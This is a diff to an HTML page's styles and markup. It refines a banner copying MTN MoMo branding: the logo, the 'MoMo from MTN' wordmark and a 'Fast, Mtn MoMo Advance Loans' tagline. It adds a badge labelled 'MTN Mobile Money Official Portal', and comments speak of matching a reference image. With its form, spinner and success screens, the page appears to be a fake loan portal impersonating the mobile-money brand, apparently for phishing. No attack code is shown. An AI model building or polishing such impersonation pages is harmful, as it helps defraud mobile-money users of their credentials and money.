@@ -105,7 +105,7 @@
             font-size: 15px;
         }
 
-        /* ==================== NEW MOMO RIBBON LOGO CSS ==================== */
+        /* ==================== TOP YELLOW BANNER (FIRST LOGO LIKE IMAGE 1) ==================== */
         .momo-banner-card {
             margin: 0 0 12px 0;
             width: 100%;
@@ -121,10 +121,10 @@
             position: relative;
         }
         .momo-app-icon {
-            width: 78px;
-            height: 78px;
+            width: 84px;
+            height: 84px;
             background-color: #004065;
-            border-radius: 16px;
+            border-radius: 20px;
             position: relative;
             overflow: hidden;
             display: flex;
@@ -133,8 +133,8 @@
             box-shadow: 0 4px 10px rgba(0, 64, 101, 0.25);
         }
         .momo-ribbon-svg {
-            width: 62px;
-            height: 62px;
+            width: 64px;
+            height: 64px;
             margin-bottom: 6px;
         }
         .momo-icon-bottom-bar {
@@ -145,16 +145,56 @@
             height: 8px;
             background-color: #ffcc00;
         }
-        /* Second MoMo from MTN Box */
-        .momo-secondary-box {
+        /* First Logo Text Directly on Yellow Background (Like Image 1) */
+        .momo-primary-text-block {
             margin-top: 12px;
-            background-color: #004065;
-            color: #ffcc00;
-            padding: 8px 22px;
-            border-radius: 14px;
-            border: 2px solid #002d62;
-            box-shadow: 0 3px 8px rgba(0, 0, 0, 0.2);
             text-align: center;
+            line-height: 1.05;
+        }
+        .momo-primary-main {
+            font-family: 'Arial Black', -apple-system, sans-serif;
+            font-size: 28px;
+            font-weight: 900;
+            letter-spacing: -0.5px;
+            color: #004065;
+        }
+        .momo-primary-sub {
+            font-size: 13px;
+            font-weight: 800;
+            color: #004065;
+            letter-spacing: 0.4px;
+            margin-top: 2px;
+        }
+        .momo-tagline {
+            margin-top: 12px;
+            font-size: 13px;
+            font-weight: 800;
+            color: #004065;
+            letter-spacing: 0.3px;
+            text-align: center;
+        }
+
+        /* ==================== SECOND LOGO BOX (WHERE GREEN X WAS MARKED) ==================== */
+        .momo-green-x-container {
+            background-color: #004065;
+            border: 1.5px solid #005b8f;
+            border-radius: 16px;
+            margin: 4px 16px 12px 16px;
+            padding: 14px 18px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.25);
+            z-index: 2;
+            position: relative;
+        }
+        .momo-secondary-badge {
+            background-color: #002d62;
+            padding: 8px 24px;
+            border-radius: 12px;
+            border: 1.5px solid #ffcc00;
             line-height: 1.05;
         }
         .momo-wordmark-main {
@@ -165,24 +205,29 @@
             color: #ffcc00;
         }
         .momo-wordmark-sub {
-            font-size: 10px;
+            font-size: 11px;
             font-weight: 800;
             color: #ffffff;
-            letter-spacing: 0.4px;
+            letter-spacing: 0.5px;
             margin-top: 2px;
         }
-        .momo-tagline {
-            margin-top: 14px;
-            font-size: 13px;
-            font-weight: 800;
-            color: #004065;
-            letter-spacing: 0.3px;
-            text-align: center;
+        .momo-navy-caption {
+            margin-top: 8px;
+            font-size: 12px;
+            font-weight: 700;
+            color: #cbdcf0;
+            letter-spacing: 0.4px;
+        }
+
+        /* Hide unstyled duplicate sub-header above the form */
+        main .screen > div:first-child:not(.landing-hero):not(.form-scaffold):not(.spinner-viewport):not(.success-card) {
+            display: none !important;
         }
     </style>
 </head>
 <body>
     <div class="app-window">
+        <!-- First Logo: Matches Image 1 -->
         <div class="momo-banner-card">
             <div class="momo-app-icon">
                 <svg class="momo-ribbon-svg" viewBox="0 0 100 100">
@@ -193,16 +238,26 @@
                 <div class="momo-icon-bottom-bar"></div>
             </div>
 
-            <div class="momo-secondary-box">
-                <div class="momo-wordmark-main">MoMo</div>
-                <div class="momo-wordmark-sub">from MTN</div>
+            <div class="momo-primary-text-block">
+                <div class="momo-primary-main">MoMo</div>
+                <div class="momo-primary-sub">from MTN</div>
             </div>
 
             <div class="momo-tagline">Fast, Mtn MoMo Advance Loans</div>
         </div>
 
+        <!-- Second Logo Box: Placed Where Green X Was Marked -->
+        <div class="momo-green-x-container">
+            <div class="momo-secondary-badge">
+                <div class="momo-wordmark-main">MoMo</div>
+                <div class="momo-wordmark-sub">from MTN</div>
+            </div>
+            <div class="momo-navy-caption">MTN Mobile Money Official Portal</div>
+        </div>
+
         <!-- 3. Your App Screen Layout Continues Below Dynamically -->
         <main>
+
 
 
 
